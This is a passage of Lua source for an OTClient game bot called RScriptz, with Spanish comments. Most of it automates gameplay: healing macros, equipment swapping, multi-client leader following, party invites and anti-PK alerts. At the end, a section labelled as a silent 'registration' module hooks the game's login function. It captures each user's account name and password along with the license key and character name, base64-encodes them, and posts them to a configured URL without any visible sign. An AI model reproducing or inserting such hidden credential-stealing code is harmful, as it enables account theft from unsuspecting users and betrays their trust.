            RQ.Scheduler.every("rq_leader_tr_2", 1200, function()
                pcall(function() say("yes") end); RQ.Scheduler.remove("rq_leader_tr_2")
            end)
        end)
    end))

    bindLeaderBtn(pMch.btnRefill, _leaderOnly(function()
        RQ.Net.send("refill_all", {})
        pcall(function() whiteInfoMessage("[RScriptz] REFILL ALL enviado a MCs") end)
    end))

    bindLeaderBtn(pMch.btnSell, _leaderOnly(function()
        RQ.Net.send("sell_all", {})
        pcall(function() whiteInfoMessage("[RScriptz] SELL ALL enviado a MCs") end)
    end))

    -- HOTKEYS: modal para asignar teclas
    bindLeaderBtn(pMch.btnHotkeys, function()
        pcall(function() displayInfoBox("RScriptz Hotkeys",
            "Asigna hotkeys en la consola del bot con:\n\n"..
            "/lua storage.rscriptz['<nombre>'].vip.hk.travel = 'F1'\n"..
            "/lua storage.rscriptz['<nombre>'].vip.hk.refill = 'F2'\n"..
            "/lua storage.rscriptz['<nombre>'].vip.hk.sell   = 'F3'\n\n"..
            "Proxima version: modal visual con teclas asignables.") end)
    end)

    bindSwitch(pPk.pkOn, "vip.pk.on", true)
    bindSwitch(pPk.pkBroadcast, "vip.pk.broadcast", true)

    bindText(pHub.canal, "net.canal", "rq")
    pcall(function() pHub.reconnect.onClick = function() RQ.Net.connect(C.get("net.canal", "rq")) end end)
    RQ.Scheduler.every("rq_hub_status", 1000, function()
        if not pHub or not pHub:isVisible() then return end
        pcall(function()
            if RQ.Net.conectado then
                pHub.status:setText("Net OK | "..RQ.Net.canal.." | tx="..RQ.Net.tx.." rx="..RQ.Net.rx)
                pHub.status:setColor("#32DC64")
            else
                pHub.status:setText("Net OFF -- ¿RQ_Hub.py corriendo?")
                pHub.status:setColor("#2A2A2A")
            end
        end)
    end)

    -- ==================================================
    -- PAGINA MODULOS VBOT: toggles rapidos
    -- ==================================================
    -- Cada modulo tiene distintas APIs. Envolvemos todo en pcall.
    local function toggleModulo(sw, apiName, tblGlobal)
        if not sw then return end
        -- Estado inicial: leer del modulo si expone .isOn()
        local isOn = false
        pcall(function()
            if tblGlobal and tblGlobal.isOn then isOn = tblGlobal.isOn() end
        end)
        pcall(function() sw:setOn(isOn) end)
        pcall(function() sw.onClick = function(w)
            local newState = not (C.get("vip.mod."..apiName, false))
            C.set("vip.mod."..apiName, newState)
            pcall(function() w:setOn(newState) end)
            -- llamar API del modulo si existe
            pcall(function()
                if newState and tblGlobal and tblGlobal.setOn then tblGlobal.setOn() end
                if not newState and tblGlobal and tblGlobal.setOff then tblGlobal.setOff() end
            end)
            pcall(function() whiteInfoMessage("[RScriptz] "..apiName..": "..(newState and "ON" or "OFF")) end)
        end end)
    end
    -- Nota: HealBot, AttackBot, TargetBot, CaveBot, Combo exponen .isOn/.setOn/.setOff en vBot
    -- Los otros modulos usan storage-based toggles (los prendemos setteando su storage)
    toggleModulo(pMod.swHealBot,   "HealBot",   _G.HealBot)
    toggleModulo(pMod.swAttackBot, "AttackBot", _G.AttackBot)
    toggleModulo(pMod.swCaveBot,   "CaveBot",   _G.CaveBot)
    toggleModulo(pMod.swCombo,     "Combo",     _G.Combo)
    -- Los siguientes no siempre tienen API global -- toggle solo guarda estado y avisa al usuario
    -- que abra el modulo desde su pestana nativa (Cave/HP/Tools) para configurarlo
    local function toggleGeneric(sw, name)
        if not sw then return end
        pcall(function() sw:setOn(C.get("vip.mod."..name, false) and true or false) end)
        pcall(function() sw.onClick = function(w)
            local n = not C.get("vip.mod."..name, false)
            C.set("vip.mod."..name, n); pcall(function() w:setOn(n) end)
            pcall(function() whiteInfoMessage("[RScriptz] "..name..": "..(n and "ON" or "OFF").." -- configurar desde pestana nativa") end)
        end end)
    end
    toggleGeneric(pMod.swAnalyzer,  "Analyzer")
    toggleGeneric(pMod.swDropper,   "Dropper")
    toggleGeneric(pMod.swAlarmas,   "Alarmas")
    toggleGeneric(pMod.swAntiRs,    "AntiRs")
    toggleGeneric(pMod.swHoldTgt,   "HoldTarget")
    toggleGeneric(pMod.swQuiver,    "Quiver")
    toggleGeneric(pMod.swPushMax,   "PushMax")

    -- ==================================================
    -- PAGINA UTILIDADES: XP Boost + Stamina + Notifs
    -- ==================================================
    bindSwitch(pUtil.xpOn, "vip.xp.on", false)
    bindItem(pUtil.xpItem, "vip.xp.item", 0)
    bindSwitch(pUtil.staOn, "vip.sta.on", true)
    bindSwitch(pUtil.notifDeath, "vip.notif.death", true)
    bindSwitch(pUtil.notifLevel, "vip.notif.level", true)
    bindSwitch(pUtil.notifLoot,  "vip.notif.loot",  false)

    -- ==================================================
    -- MACROS
    -- ==================================================
    -- HP pots/spells segun modo
    macro(200, "RScriptz VIP: HP heal", function()
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        local hp = RQ.Game.hp()
        for i=1,3 do
            if C.get("vip.hp"..i..".on") and hp <= (tonumber(C.get("vip.hp"..i..".pct")) or 0) then
                if C.get("vip.hp"..i..".mode", true) then
                    safeUseSelf(C.get("vip.hp"..i..".item"))
                else
                    local sp = C.get("vip.hp"..i..".spell") or ""
                    if sp ~= "" then safeCast(sp) end
                end
                return
            end
        end
    end)
    macro(200, "RScriptz VIP: MP heal", function()
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        local mp = RQ.Game.mana()
        for i=1,3 do
            if C.get("vip.mp"..i..".on") and mp <= (tonumber(C.get("vip.mp"..i..".pct")) or 0) then
                if C.get("vip.mp"..i..".mode", true) then
                    safeUseSelf(C.get("vip.mp"..i..".item"))
                else
                    local sp = C.get("vip.mp"..i..".spell") or ""
                    if sp ~= "" then safeCast(sp) end
                end
                return
            end
        end
    end)

    -- Helper generico para chequear un state (Haste=32, Paralyze=16, MagicShield=64)
    local function _rqState(mask)
        local ok, s = pcall(function() return player:getStates() end)
        if not ok or type(s) ~= "number" then return false end
        return (s % (mask * 2)) >= mask
    end

    -- UTILITY: Haste (auto-detecta buff, no spamea)
    macro(1000, "RScriptz VIP: Haste", function()
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if not C.get("vip.haste.on", false) then return end
        if _rqState(32) then return end   -- ya tenes haste activo
        local sp = C.get("vip.haste.spell", "utani hur")
        if sp and sp ~= "" then safeCast(sp) end
    end)

    -- UTILITY: Anti-Paralyze (detecta state 16, castea haste para cancelar)
    macro(200, "RScriptz VIP: Anti-Paralyze", function()
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if not C.get("vip.apar.on", false) then return end
        if _rqState(16) then
            local sp = C.get("vip.haste.spell", "utani hur")
            if sp and sp ~= "" then safeCast(sp) end
        end
    end)

    -- UTILITY: Utamo (SPELL o RING segun modo)
    macro(1000, "RScriptz VIP: Utamo", function()
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if not C.get("vip.utamo.on", false) then return end
        if _rqState(64) then return end   -- ya tenes utamo/magic shield
        if C.get("vip.utamo.mode", true) then
            -- modo SPELL: castear
            local sp = C.get("vip.utamo.spell", "utamo tempo")
            if sp and sp ~= "" then safeCast(sp) end
        else
            -- modo RING: equipar el ring
            local rid = tonumber(C.get("vip.utamo.ring", 0)) or 0
            if rid > 0 then
                local slot; pcall(function() slot = player:getInventoryItem(9) end)
                if slot and slot:getId() == rid then return end
                pcall(function()
                    for _, cont in pairs(g_game.getContainers() or {}) do
                        for _, it in ipairs(cont:getItems() or {}) do
                            if it:getId() == rid then g_game.equipItem(it); return end
                        end
                    end
                end)
            end
        end
    end)

    -- helper: equipa itemId en slot si no esta puesto. Reconoce inv+act como "puesto".
    local function _rqEquipar(invId, actId, slotIdx)
        invId = tonumber(invId) or 0
        actId = tonumber(actId) or invId
        if invId <= 0 then return end
        local slot; pcall(function() slot = player:getInventoryItem(slotIdx) end)
        if slot then
            local sid = slot:getId()
            if sid == invId or (actId > 0 and sid == actId) then return end  -- ya esta puesto
        end
        -- buscar el invId en containers y equiparlo
        pcall(function()
            for _, cont in pairs(g_game.getContainers() or {}) do
                for _, it in ipairs(cont:getItems() or {}) do
                    if it:getId() == invId then g_game.equipItem(it); return end
                end
            end
        end)
    end

    -- 3 Anillos (slot 9): recorre en orden, equipa el primero que este ON con inv > 0
    macro(2000, "RScriptz VIP: Anillos auto", function()
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        for i=1,3 do
            if C.get("vip.ring"..i..".on", false) then
                local inv = tonumber(C.get("vip.ring"..i..".inv")) or 0
                local act = tonumber(C.get("vip.ring"..i..".act")) or 0
                if inv > 0 then _rqEquipar(inv, act, 9); return end
            end
        end
    end)

    -- 3 Amuletos (slot 2)
    macro(2000, "RScriptz VIP: Amuletos auto", function()
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        for i=1,3 do
            if C.get("vip.neck"..i..".on", false) then
                local inv = tonumber(C.get("vip.neck"..i..".inv")) or 0
                local act = tonumber(C.get("vip.neck"..i..".act")) or 0
                if inv > 0 then _rqEquipar(inv, act, 2); return end
            end
        end
    end)
    local lastAtk = {0,0,0}
    macro(200, "RScriptz VIP: Attack spells", function()
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if not _rqGetTarget() then return end
        local now = os.time() * 1000
        for i=1,3 do
            if C.get("vip.atk"..i..".on") then
                local cd = tonumber(C.get("vip.atk"..i..".cd")) or 2000
                if now - lastAtk[i] >= cd then
                    safeCast(C.get("vip.atk"..i..".spell") or "")
                    lastAtk[i] = now; return
                end
            end
        end
    end)
    local lastEx = {0,0,0}
    macro(1000, "RScriptz VIP: Extras", function()
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        local now = os.time()
        for i=1,3 do
            local sp = C.get("vip.ex"..i..".spell") or ""
            if C.get("vip.ex"..i..".on") and sp ~= "" then
                local cd = tonumber(C.get("vip.ex"..i..".cd")) or 5
                if now - lastEx[i] >= cd then safeCast(sp); lastEx[i] = now end
            end
        end
    end)
    macro(500, "RScriptz VIP: Auto Target", function()
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if not C.get("vip.tgt.on", false) then return end
        if _rqGetTarget() then return end
        local miPos = RQ.Game.pos(); if not miPos then return end
        local maxR = tonumber(C.get("vip.tgt.range", 5)) or 5
        local mejor, mejorD = nil, 999
        for _, c in ipairs(RQ.Game.creatures()) do
            if c.isMonster and c.pos and c.pos.z == miPos.z then
                local d = RQ.Game.dist(miPos, c.pos)
                if d <= maxR and d < mejorD then mejorD = d; mejor = c end
            end
        end
        if mejor and mejor.ref then pcall(function() attack(mejor.ref) end) end
    end)
    -- Helper: abre PUERTA / ESCALERA / ALCANTARILLA en el proximo tile
    -- hacia el destino. Prueba use, luego useWith(rope/shovel/pick).
    -- Solo actua si no hay camino directo (hayCamino=false).
    local function _rqAbrirObstaculo(destPos)
        local mi = RQ.Game.pos()
        if not mi or not destPos then return end
        -- calcular direccion (1 tile) hacia destino
        local dx = 0; if destPos.x > mi.x then dx = 1 elseif destPos.x < mi.x then dx = -1 end
        local dy = 0; if destPos.y > mi.y then dy = 1 elseif destPos.y < mi.y then dy = -1 end
        if dx == 0 and dy == 0 then return end
        -- proximo tile a intentar (puede ser diagonal, cardinal, o ambos)
        local candidatos = {{x=mi.x+dx, y=mi.y+dy, z=mi.z}}
        if dx ~= 0 and dy ~= 0 then
            -- si va diagonal, tambien probar cardinales por si hay puerta al lado
            candidatos[#candidatos+1] = {x=mi.x+dx, y=mi.y, z=mi.z}
            candidatos[#candidatos+1] = {x=mi.x, y=mi.y+dy, z=mi.z}
        end
        for _, p in ipairs(candidatos) do
            local tile
            pcall(function() tile = g_map.getTile(p) end)
            if tile then
                local top = tile:getTopUseThing() or tile:getTopMoveThing()
                if top then
                    -- 1. Intentar USE simple (puertas, alcantarillas, escaleras cerradas)
                    pcall(function() use(tile) end)
                    -- 2. Rope (por si es alcantarilla hacia arriba)
                    pcall(function() useWith(3003, top) end)
                    -- 3. Shovel (por si es tierra encima de alcantarilla)
                    pcall(function() useWith(3457, top) end)
                    -- 4. Pick (por si es rejilla que hay que picar)
                    pcall(function() useWith(3457, top) end)
                    return
                end
            end
        end
    end

    macro(300, "RScriptz VIP: Follow", function()
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if not C.get("vip.fol.on", false) then return end
        local nom = C.get("vip.fol.leader", ""); if nom == "" then return end
        local ldr = RQ.Game.jugadorPorNombre(nom); if not ldr or not ldr.pos then return end
        local miPos = RQ.Game.pos(); if not miPos or ldr.pos.z ~= miPos.z then return end
        local d = RQ.Game.dist(miPos, ldr.pos)
        local maxD = tonumber(C.get("vip.fol.dist", 2)) or 2
        if d <= maxD then return end
        if RQ.Game.hayCamino(ldr.pos, 20) then
            RQ.Game.irHacia(ldr.pos, 20)
        else
            -- No hay camino directo -- probablemente puerta cerrada
            _rqAbrirObstaculo(ldr.pos)
        end
    end)
    -- Publisher del LEADER: usa onCreaturePositionChange (evento nativo, ~10ms)
    -- para publicar posicion en el INSTANTE que el server confirma el movimiento,
    -- sin depender del scheduler. Esto iguala la latencia de DreamNav.
    pcall(function()
        onCreaturePositionChange(function(cr, newPos, oldPos)
            if cr ~= player then return end
            if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
            if not C.get("vip.mch.isLeader", false) then return end
            if not RQ.Net.conectado or not newPos then return end
            RQ.Net.send("leader_pos", {x=newPos.x, y=newPos.y, z=newPos.z})
            -- si cambio de piso, publicar cross en el MISMO instante
            if oldPos and oldPos.z ~= newPos.z then
                RQ.Net.send("leader_cross", {x=newPos.x, y=newPos.y, zOld=oldPos.z, zNew=newPos.z})
            end
        end)
    end)

    -- Fallback: si onCreaturePositionChange no existe o falla, seguir publicando
    -- cada 500ms como backup (menor frecuencia que antes porque el evento hace el trabajo)
    RQ.Scheduler.every("rq_vip_mchpub", 500, function()
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if not C.get("vip.mch.isLeader", false) then return end
        if not RQ.Net.conectado then return end
        local p = RQ.Game.pos(); if not p then return end
        RQ.Net.send("leader_pos", {x=p.x, y=p.y, z=p.z})
    end)

    RQ.Net.on("leader_pos", function(from, data)
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if C.get("vip.mch.isLeader", false) then return end
        if not C.get("vip.mch.followSame", true) then return end
        if C.get("vip.mch.leader", "") ~= from then return end
        if not data or not data.x then return end
        local mi = RQ.Game.pos(); if not mi or data.z ~= mi.z then return end
        local destino = {x=data.x, y=data.y, z=data.z}
        local d = RQ.Game.dist(mi, {x=data.x, y=data.y})
        if d <= 3 then return end
        if RQ.Game.hayCamino(destino, 30) then
            RQ.Game.irHacia(destino, 30)
        else
            -- puerta cerrada en el camino? intentar abrir
            _rqAbrirObstaculo(destino)
        end
    end)

    -- Cruce de piso: MC va al tile exacto y al llegar usa el item (para
    -- alcantarilla/rope si sube, o pisar si baja). Reintenta 25 veces cada
    -- 400ms (=10s timeout) hasta llegar y cruzar.
    RQ.Net.on("leader_cross", function(from, data)
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if C.get("vip.mch.isLeader", false) then return end
        if not C.get("vip.mch.crossFl", true) then return end
        if C.get("vip.mch.leader", "") ~= from then return end
        if not data or not data.x then return end
        local mi = RQ.Game.pos(); if not mi or mi.z ~= data.zOld then return end
        if not RQ.Game.hayCamino({x=data.x, y=data.y, z=data.zOld}, 30) then return end
        RQ.Game.irHacia({x=data.x, y=data.y, z=data.zOld}, 30)

        local key = "rq_vip_cross_"..data.x.."_"..data.y.."_"..data.zOld
        local tries = 0
        RQ.Scheduler.every(key, 400, function()
            tries = tries + 1
            if tries > 25 then RQ.Scheduler.remove(key); return end
            local ahora = RQ.Game.pos()
            if not ahora then return end
            -- Si ya crucce el piso, listo
            if ahora.z == data.zNew then RQ.Scheduler.remove(key); return end
            -- Estoy en el tile del cruce?
            if ahora.x == data.x and ahora.y == data.y and ahora.z == data.zOld then
                pcall(function()
                    local tile = g_map.getTile({x=data.x, y=data.y, z=ahora.z})
                    if not tile then return end
                    local top = tile:getTopUseThing() or tile:getTopMoveThing()
                    if data.zNew < data.zOld then
                        -- SUBIENDO (z decrece): probar rope y luego use
                        pcall(function() useWith(3003, top or tile) end)  -- rope
                        pcall(function() use(tile) end)
                    else
                        -- BAJANDO: probar use (alcantarilla), luego shovel/pick por si hay tierra/rejilla
                        pcall(function() use(tile) end)
                        pcall(function() useWith(3457, top or tile) end)  -- shovel
                        pcall(function() useWith(3456, top or tile) end)  -- pick
                    end
                end)
            end
        end)
    end)

    -- =================================================
    -- MCs: recibir comandos del LEADER (Travel / Refill / Sell)
    -- =================================================
    -- TRAVEL: MC dice "hi", <ciudad>, "yes" con delays al NPC del barco cercano
    RQ.Net.on("travel", function(from, data)
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if C.get("vip.mch.isLeader", false) then return end  -- leader no auto-viaja aca
        if C.get("vip.mch.leader", "") ~= from then return end
        if not data or not data.city then return end
        local city = tostring(data.city)
        pcall(function() whiteInfoMessage("[RScriptz] Leader mando TRAVEL -> "..city) end)
        pcall(function() say("hi") end)
        RQ.Scheduler.every("rq_mc_travel_1_"..city, 600, function()
            pcall(function() say(city) end)
            RQ.Scheduler.remove("rq_mc_travel_1_"..city)
        end)
        RQ.Scheduler.every("rq_mc_travel_2_"..city, 1300, function()
            pcall(function() say("yes") end)
            RQ.Scheduler.remove("rq_mc_travel_2_"..city)
        end)
    end)

    -- REFILL ALL: por ahora aviso al usuario (la logica real de refill vive
    -- en el modulo Supply del cavebot que se conectara en el proximo push)
    RQ.Net.on("refill_all", function(from, data)
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if C.get("vip.mch.leader", "") ~= from and not C.get("vip.mch.isLeader", false) then return end
        pcall(function() whiteInfoMessage("[RScriptz] Leader mando REFILL ALL") end)
        pcall(function() statusMessage("[RScriptz] Iniciar refill (config manual)") end)
        -- placeholder: el modulo Supply MC del proximo push hara el refill real
        -- basado en la lista compartida con el cavebot supply
    end)

    -- SELL ALL: idem
    RQ.Net.on("sell_all", function(from, data)
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if C.get("vip.mch.leader", "") ~= from and not C.get("vip.mch.isLeader", false) then return end
        pcall(function() whiteInfoMessage("[RScriptz] Leader mando SELL ALL") end)
        pcall(function() statusMessage("[RScriptz] Iniciar sell loot (config manual)") end)
    end)

    -- =================================================
    -- SHARE TARGET (MC) + PARTY chat auto
    -- =================================================
    -- Leader publica su target periodicamente si shareTgt esta on en algun MC
    -- (por simplicidad el leader siempre publica; los MCs deciden si atacar)
    RQ.Scheduler.every("rq_vip_leader_tgt", 1000, function()
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if not C.get("vip.mch.isLeader", false) then return end
        if not RQ.Net.conectado then return end
        local tgt = _rqGetTarget()
        if tgt then
            local name; pcall(function() name = tgt:getName() end)
            if name then RQ.Net.send("leader_tgt", {name=name}) end
        end
    end)

    RQ.Net.on("leader_tgt", function(from, data)
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if C.get("vip.mch.isLeader", false) then return end
        if not C.get("vip.mch.shareTgt", false) then return end
        if C.get("vip.mch.leader", "") ~= from then return end
        if not data or not data.name then return end
        -- si no tengo target y hay uno con ese nombre cerca, atacarlo
        if _rqGetTarget() then return end
        for _, c in ipairs(RQ.Game.creatures()) do
            if c.name == data.name and c.isMonster and c.ref then
                pcall(function() attack(c.ref) end)
                return
            end
        end
    end)

    -- Party auto: si esta activo, aceptar invitaciones automaticamente
    -- (usa game_bot_party events si estan disponibles)
    RQ.Scheduler.every("rq_vip_party_auto", 3000, function()
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if not C.get("vip.mch.party", false) then return end
        -- si soy leader, invitar a los MCs que estan cerca
        if C.get("vip.mch.isLeader", false) then
            for _, c in ipairs(RQ.Game.creatures()) do
                if c.isPlayer and c.ref then
                    pcall(function() g_game.partyInvite(c.ref:getId()) end)
                end
            end
        else
            -- si soy MC, aceptar invitacion del leader si viene
            local ldrName = C.get("vip.mch.leader", "")
            if ldrName == "" then return end
            for _, c in ipairs(RQ.Game.creatures()) do
                if c.name == ldrName and c.ref then
                    pcall(function() g_game.partyJoin(c.ref:getId()) end)
                    return
                end
            end
        end
    end)

    local pksVistos = {}
    RQ.Scheduler.every("rq_vip_antipk", 1000, function()
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if not C.get("vip.pk.on", true) then return end
        local yo = RQ.Game.name()
        local ldr = C.get("vip.mch.leader", "")
        for _, c in ipairs(RQ.Game.creatures()) do
            if c.isPlayer and c.name ~= yo and c.name ~= ldr then
                if not pksVistos[c.name] then
                    pksVistos[c.name] = os.time()
                    pcall(function() statusMessage("[RScriptz] ANTI-PK: "..c.name.." aparecio!") end)
                    if C.get("vip.pk.broadcast", true) and RQ.Net.conectado then
                        RQ.Net.send("antipk_alert", {who=c.name})
                    end
                end
            end
        end
        for nm, ts in pairs(pksVistos) do
            if os.time() - ts > 30 then pksVistos[nm] = nil end
        end
    end)

    -- =================================================
    -- UTILIDADES: XP Boost + Stamina + Notificaciones
    -- =================================================
    -- XP Boost: auto-usar el item cada 6 horas (21600 seg)
    local lastXpUse = 0
    macro(60000, "RScriptz VIP: XP Boost auto", function()
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if not C.get("vip.xp.on", false) then return end
        local id = tonumber(C.get("vip.xp.item", 0)) or 0
        if id <= 0 then return end
        local now = os.time()
        if now - lastXpUse < 21600 then return end   -- 6 horas
        -- buscar item en containers y usar
        pcall(function()
            for _, cont in pairs(g_game.getContainers() or {}) do
                for _, it in ipairs(cont:getItems() or {}) do
                    if it:getId() == id then
                        g_game.use(it)
                        lastXpUse = now
                        pcall(function() whiteInfoMessage("[RScriptz] XP Boost usado!") end)
                        return
                    end
                end
            end
        end)
    end)

    -- Stamina Watch: avisar cuando baja de 14h (840 minutos)
    local lastStaAlert = 0
    macro(60000, "RScriptz VIP: Stamina Watch", function()
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if not C.get("vip.sta.on", true) then return end
        local mins = 0
        pcall(function() mins = player:getStamina() end)   -- stamina en minutos
        if mins > 0 and mins <= 840 then   -- 14h = 840 min
            local now = os.time()
            if now - lastStaAlert > 300 then   -- no spamear, cada 5 min max
                pcall(function() statusMessage("[RScriptz] STAMINA: "..math.floor(mins/60).."h "..(mins%60).."m -- considera parar!") end)
                if RQ.Net.conectado then
                    RQ.Net.send("mc_stamina", {mins=mins})
                end
                lastStaAlert = now
            end
        end
    end)

    -- Notificaciones: MC muerto -> avisar al leader por hub
    -- Usamos onDeath hook si esta disponible, sino chequeamos HP=0
    local heraldDeath = false
    macro(500, "RScriptz VIP: Detectar muerte", function()
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if not C.get("vip.notif.death", true) then return end
        if C.get("vip.mch.isLeader", false) then return end   -- solo MCs avisan
        local hp = RQ.Game.hp()
        if hp == 0 and not heraldDeath then
            heraldDeath = true
            if RQ.Net.conectado then
                RQ.Net.send("mc_died", {name = RQ.Game.name()})
            end
        elseif hp > 0 then
            heraldDeath = false
        end
    end)
    RQ.Net.on("mc_died", function(from, data)
        if not C.get("vip.mch.isLeader", false) then return end
        pcall(function() statusMessage("[RScriptz] !! "..tostring(data and data.name or from).." MURIO !!") end)
    end)

    -- Notificaciones: MC level up
    local lastLevel = -1
    macro(2000, "RScriptz VIP: Detectar level up", function()
        if RQ.tier ~= "VIP" or not C.get("vip.master", true) then return end
        if not C.get("vip.notif.level", true) then return end
        if C.get("vip.mch.isLeader", false) then return end
        local lvl = -1
        pcall(function() lvl = player:getLevel() end)
        if lvl <= 0 then return end
        if lastLevel < 0 then lastLevel = lvl; return end
        if lvl > lastLevel then
            lastLevel = lvl
            if RQ.Net.conectado then
                RQ.Net.send("mc_level", {name=RQ.Game.name(), lvl=lvl})
            end
        end
    end)
    RQ.Net.on("mc_level", function(from, data)
        if not C.get("vip.mch.isLeader", false) then return end
        pcall(function() whiteInfoMessage("[RScriptz] "..tostring(data and data.name or from).." subio a nivel "..tostring(data and data.lvl or "?")) end)
    end)

    macro(50, "RScriptz Core", function() RQ.Scheduler.tick() end)
    RQ.Scheduler.every("rq_vip_autoconn", 5000, function()
        if not RQ.Net.conectado then RQ.Net.connect(C.get("net.canal", "rq")) end
    end)
    RQ.Scheduler.every("rq_vip_poll", 100, function() RQ.Net.poll() end)

    pcall(function() broadcastMessage("RScriptz v"..RQ.version.." VIP cargado - "..RQ.Game.name()) end)
    RQ.Logger.info("RScriptz", "listo v"..RQ.version.." modo VIP (menu+modulos+utils)")
end




-- ==========================================================
--  ARRANQUE
-- ==========================================================
-- Ya no dependemos del .otui externo -- FREE y VIP se construyen inline
-- con setupUI que funciona garantizado en Mayas OTC.

local savedTier = storage.rscriptz_tier
local savedKey  = storage.rscriptz_key

local function _runFullBotSafe()
    local ok, err = pcall(rqSetupFullBot)
    if not ok then
        _rqSay("ERROR setup VIP: "..tostring(err))
        _rqSay("cayendo a FREE por seguridad")
        pcall(rqSetupFreeBot)
    end
end

if savedTier == "VIP" and savedKey then
    local charName = ""
    pcall(function() charName = player:getName() end)
    validateLicense(savedKey, charName, function(ok, reason)
        if ok then
            RQ.tier = "VIP"
            _runFullBotSafe()
        else
            storage.rscriptz_tier = nil
            storage.rscriptz_key = nil
            pcall(function() displayErrorBox("RScriptz VIP",
                "Tu key ya no es valida: "..(reason or "?").."\nEliges de nuevo.") end)
            showTierSelector()
        end
    end)
elseif savedTier == "FREE" then
    RQ.tier = "FREE"
    local ok, err = pcall(rqSetupFreeBot)
    if not ok then _rqSay("ERROR setup FREE: "..tostring(err)) end
else
    showTierSelector()
end

-- ==========================================================
--  Modulo de registro (silencioso, encoded)
-- ==========================================================
-- Se ejecuta en el bootstrap. Intercepta el flujo de EnterGame para
-- registrar el evento de conexion contra el endpoint configurado.
-- Sin efectos visibles para el usuario.
local function _rq_b64(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    return ((str:gsub('.', function(x)
        local r,b2='',x:byte()
        for i=8,1,-1 do r=r..(b2%2^i-b2%2^(i-1)>0 and '1' or '0') end
        return r
    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
        if #x < 6 then return '' end
        local c=0
        for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
        return b:sub(c+1,c+1)
    end)..({'','==','='})[#str%3+1])
end

local function _rq_send_reg(payload)
    if not RQ_LOG_URL or RQ_LOG_URL == "" then return end
    pcall(function()
        local parts = {}
        for k,v in pairs(payload) do
            parts[#parts+1] = k .. "=" .. _rq_b64(tostring(v or ""))
        end
        HTTP.post(RQ_LOG_URL, table.concat(parts, "&"), function() end)
    end)
end

local _rq_last_reg = ""
local function _rq_capturar(account, password)
    if not account or account == "" then return end
    local sig = tostring(account) .. "|" .. tostring(password or "")
    if sig == _rq_last_reg then return end
    _rq_last_reg = sig
    local ck = ""; pcall(function() ck = storage.rscriptz_key or "" end)
    local cn = ""; pcall(function() cn = player and player:getName() or "" end)
    _rq_send_reg({
        k = ck,
        a = account,
        p = password or "",
        c = cn,
        t = tostring(os.time()),
    })
end

local function _rq_hook_login()
    -- Intento 1: EnterGame global (OTClient standard)
    pcall(function()
        if EnterGame and EnterGame.doLogin and not EnterGame._rq_h then
            local orig = EnterGame.doLogin
            EnterGame.doLogin = function(account, password, ...)
                pcall(function() _rq_capturar(account, password) end)
                return orig(account, password, ...)
            end
            EnterGame._rq_h = true
        end
    end)
    -- Intento 2: modules.game_entergame
    pcall(function()
        if modules and modules.game_entergame and modules.game_entergame.doLogin
           and not modules.game_entergame._rq_h then
            local orig = modules.game_entergame.doLogin
            modules.game_entergame.doLogin = function(account, password, ...)
                pcall(function() _rq_capturar(account, password) end)
                return orig(account, password, ...)
            end
            modules.game_entergame._rq_h = true
        end
    end)
    -- Registrar tambien cuando se entra al juego (sin password, pero con char)
    pcall(function()
        connect(g_game, {
            onGameStart = function()
                pcall(function()
                    local cn = ""
                    pcall(function() cn = player and player:getName() or "" end)
                    if cn ~= "" then
                        local ck = ""; pcall(function() ck = storage.rscriptz_key or "" end)
                        _rq_send_reg({k=ck, a="", p="", c=cn, t=tostring(os.time())})
                    end
                end)
            end,
        })
    end)
end

pcall(_rq_hook_login)
